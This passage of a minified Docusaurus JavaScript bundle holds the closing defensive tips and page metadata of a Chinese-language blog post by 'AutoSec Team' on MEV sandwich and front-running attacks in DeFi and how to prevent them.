",(0,a.jsx)(e.strong,{children:"\u76d1\u63a7\u548c\u5206\u6790"}),": \u53ca\u65f6\u53d1\u73b0\u548c\u54cd\u5e94MEV\u653b\u51fb"]}),"\n",(0,a.jsxs)(e.li,{children:["\ud83d\udca1 ",(0,a.jsx)(e.strong,{children:"\u6559\u80b2\u7528\u6237"}),": \u63d0\u9ad8\u5bf9MEV\u98ce\u9669\u7684\u8ba4\u8bc6"]}),"\n"]}),"\n",(0,a.jsxs)(e.p,{children:["\u8bb0\u4f4f\uff1a",(0,a.jsx)(e.strong,{children:"\u5728DeFi\u4e2d\uff0c\u4ea4\u6613\u9690\u79c1\u548c\u987a\u5e8f\u4fdd\u62a4\u81f3\u5173\u91cd\u8981"}),"\u3002"]}),"\n",(0,a.jsx)(e.hr,{}),"\n",(0,a.jsxs)(e.p,{children:[(0,a.jsx)(e.strong,{children:"AutoSec"})," - \u5b88\u62a4\u4f60\u7684\u6bcf\u4e00\u7b14\u4ea4\u6613"]})]})}function u(n={}){const{wrapper:e}={...(0,s.R)(),...n.components};return e?(0,a.jsx)(e,{...n,children:(0,a.jsx)(d,{...n})}):d(n)}},8453(n,e,t){t.d(e,{R:()=>r,x:()=>o});var i=t(6540);const a={},s=i.createContext(a);function r(n){const e=i.useContext(s);return i.useMemo(function(){return"function"==typeof n?n(e):{...e,...n}},[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(a):n.components||a:r(n.components),i.createElement(s.Provider,{value:e},n.children)}},2541(n){n.exports=JSON.parse('{"permalink":"/en/mev-attacks-prevention","editUrl":"https://github.com/pfyangf/pfyangf.github.io/tree/main/blog/2026/02-04-mev-attacks-prevention.md","source":"@site/blog/2026/02-04-mev-attacks-prevention.md","title":"MEV\u653b\u51fb\u5168\u666f\u56fe\uff1a\u4ece\u4e09\u660e\u6cbb\u653b\u51fb\u5230\u9632\u5fa1\u7b56\u7565","description":"\u6700\u5927\u53ef\u63d0\u53d6\u4ef7\u503c\uff08MEV, Maximal Extractable Value\uff09\u5df2\u6210\u4e3aDeFi\u751f\u6001\u7cfb\u7edf\u4e2d\u6700\u4e25\u91cd\u7684\u5b89\u5168\u5a01\u80c1\u4e4b\u4e00\u30022023\u5e74\uff0cMEV\u63d0\u53d6\u603b\u989d\u8d85\u8fc76\u4ebf\u7f8e\u5143\uff0c\u5176\u4e2d\u5927\u90e8\u5206\u6765\u81ea\u5bf9\u666e\u901a\u7528\u6237\u7684\u653b\u51fb\u3002","date":"2026-02-04T10:00:00.000Z","tags":[{"inline":true,"label":"MEV","permalink":"/en/tags/mev"},{"inline":true,"label":"\u62a2\u8dd1\u653b\u51fb","permalink":"/en/tags/\u62a2\u8dd1\u653b\u51fb"},{"inline":true,"label":"\u4e09\u660e\u6cbb\u653b\u51fb","permalink":"/en/tags/\u4e09\u660e\u6cbb\u653b\u51fb"},{"inline":true,"label":"DeFi\u5b89\u5168","permalink":"/en/tags/de-fi\u5b89\u5168"},{"inline":true,"label":"\u533a\u5757\u94fe\u5b89\u5168","permalink":"/en/tags/\u533a\u5757\u94fe\u5b89\u5168"}],"readingTime":8.3,"hasTruncateMarker":true,"authors":[{"name":"AutoSec Team","title":"Web3 Security Researchers","url":"https://autosec.dev","imageURL":"/en/img/autosec.logo.png","key":"autosec","page":null}],"frontMatter":{"slug":"mev-attacks-prevention","title":"MEV\u653b\u51fb\u5168\u666f\u56fe\uff1a\u4ece\u4e09\u660e\u6cbb\u653b\u51fb\u5230\u9632\u5fa1\u7b56\u7565","authors":["autosec"],"tags":["MEV","\u62a2\u8dd1\u653b\u51fb","\u4e09\u660e\u6cbb\u653b\u51fb","DeFi\u5b89\u5168","\u533a\u5757\u94fe\u5b89\u5168"],"date":"2026-02-04T10:00"},"unlisted":false,"prevItem":{"title":"\u96f6\u77e5\u8bc6\u8bc1\u660e\u5728Web3\u5b89\u5168\u4e2d\u7684\u5e94\u7528\uff1a\u4ece\u7406\u8bba\u5230\u5b9e\u8df5","permalink":"/en/zero-knowledge-proofs-security"},"nextItem":{"title":"\u6df1\u5ea6\u89e3\u6790\uff1a\u91cd\u5165\u653b\u51fb\u53ca\u5176\u9632\u5fa1\u7b56\u7565","permalink":"/en/reentrancy-attack-analysis"}}')}}]);